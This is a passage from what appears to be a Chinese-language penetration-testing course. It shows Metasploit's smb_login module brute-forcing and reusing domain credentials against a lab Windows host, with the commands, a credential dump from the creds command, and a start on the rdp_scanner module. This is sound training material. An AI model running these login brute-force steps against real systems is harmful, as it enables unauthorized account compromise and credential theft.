
USERPASS_FILE     (blank)             no        File containing users and passwords sepa

USER_AS_PASS      false               no        Try the username as the password for all

USER_FILE         (blank)             no        File containing usernames, one per line

VERBOSE           true                yes       Whether to print output for all attempts

*列表 750 - 加载 smb_login 模块并列出选项*

输出结果显示，该模块接受必需参数（如 `RHOSTS`）和可选参数（如 `SMBDomain`）。然而，我们注意到尽管我们在之前的 smb2 模块中设置了它，但 `RHOSTS` 并未设置。这是因为 `set` 命令只在当前运行模块的作用域内定义参数。相反，我们可以使用 `setg` 命令设置全局参数，该参数在所有模块中可用。

> 我们经常在辅助模块中更改的一个参数是 `THREADS`。该参数告诉框架为运行模块启动多少个线程，从而增加并发度和速度。我们不希望这个数字过于极端，但适度的增加会显著缩短运行时间。

为了进行演示，假设我们在评估过程中发现了有效的域凭据。我们想要确定这些凭据是否可以重用于其他开放了 TCP 445 端口的服务器。为了简单起见，我们将在我们的 Windows 客户端上尝试这种方法，从一个无效的密码开始。

我们将从提供有效的域名 `corp.com`、有效的用户名 `Offsec`、*无效*的密码 `ABCDEFG123!` 以及 Windows 10 目标的 IP 地址开始。

```
msf5 auxiliary(scanner/smb/smb_login) > set SMBDomain corp.com

SMBDomain => corp.com

msf5 auxiliary( scanner/smb/smb_login) > set SMBUser Offsec

SMBUser => Offsec

msf5 auxiliary( scanner/smb/smb_login) > set SMBPass ABCDEFG123!

SMBPass => ABCDEFG123!

msf5 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.11.0.22

RHOSTS => 10.11.0.22

msf5 auxiliary(scanner/smb/smb_login) > set THREADS 10

THREADS => 10

msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.11.0.22:445 - 10.11.0.22:445 - Starting SMB login brute force

[*] 10.11.0.22:445 - 10.11.0.22:445 - This system does not accept authentication wit

[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: 'corp.com|Offsec:ABCDEFG123!!',

[*] Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed
```

*列表 751 - 尝试 SMB 登录*

由于我们知道提供的密码是无效的，登录如预期般失败。现在，让我们尝试提供一个有效的密码并重新运行该模块。

```
msf5 auxiliary(scanner/smb/smb_login) > set SMBPass Qwerty09!

SMBPass => Qwerty09!

msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.11.0.22:445 - 10.11.0.22:445 - Starting SMB login brute force

[*] 10.11.0.22:445 - 10.11.0.22:445 - This system does not accept authentication wit

[*] 10.11.0.22:445 - 10.11.0.22:445 - Success: 'corp.com|Offsec:Qwerty09!' Administr ator

[*] Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed
```

*列表 752 - 使用有效凭据尝试 SMB 登录*

这次，身份验证成功了。我们可以使用 `creds` 命令从数据库中检索有关成功登录尝试的信息。

```
msf5 > creds

Credentials

=========
```

| 主机 | 来源 | 服务 | 公开 | 私有 | 域 | 私有类型 |
|------|------|------|------|------|----|----------|
| 10.11.0.22 | 10.11.0.22 | 445/tcp (Microsoft-ds) | Offsec | Qwerty09! | corp.com | 密码 |

*列表 753 - 列出所有发现的凭据*

虽然这次运行成功了，但这种方法的可扩展性较差。为了测试包含多种密码的更大用户群，我们可以使用 `USERPASS_FILE` 参数，该参数指示模块使用一个包含以空格分隔的用户名和密码的文件，每行一对。

```
msf5 auxiliary(scanner/smb/smb_login) > set USERPASS_FILE /home/kali/users.txt

USERPASS_FILE => /home/kali/users.txt

msf5 auxiliary(scanner/smb/smb_login) > run

[*] 10.11.0.22:445 - 10.11.0.22:445 - Starting SMB login brute force

[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: 'bob:Qwerty09!',

[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: 'bob:password',

[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: 'alice:Qwerty09!',

[-] 10.11.0.22:445 - 10.11.0.22:445 - Failed: 'alice:password',

[*] 10.11.0.22:445 - 10.11.0.22:445 - Success: '\office$Qwerty09!'

[*] 10.11.0.22:445 - Scanned 1 of 1 hosts (100% complete)

[*] Auxiliary module execution completed
```

*列表 754 - 使用用户名和密码文件暴力破解 SMB 登录*

让我们尝试另一个模块。在这个例子中，我们将尝试识别监听 TCP 3389 端口的机器，这表明它们可能接受远程桌面协议 (RDP) 连接。为此，我们将调用 `scanner/rdp/rdp_scanner` 模块。

```
msf5 auxiliary(scanner/smb/smb_login) > use scanner/rdp/rdp_scanner

msf5 auxiliary(scanner/rdp/rdp_scanner) > show options

Module options (auxiliary/scanner/rdp/rdp_scanner):

Name        Current Setting   Required  Description

----        ---------------   --------  -----------

CredSSP     true              yes       Whether or not to request CredSSP

EarlyUser   false             yes       Whether to support Earlier User Authorization Re

RHOSTS      (blank)           yes       The target address range or CIDR identifier
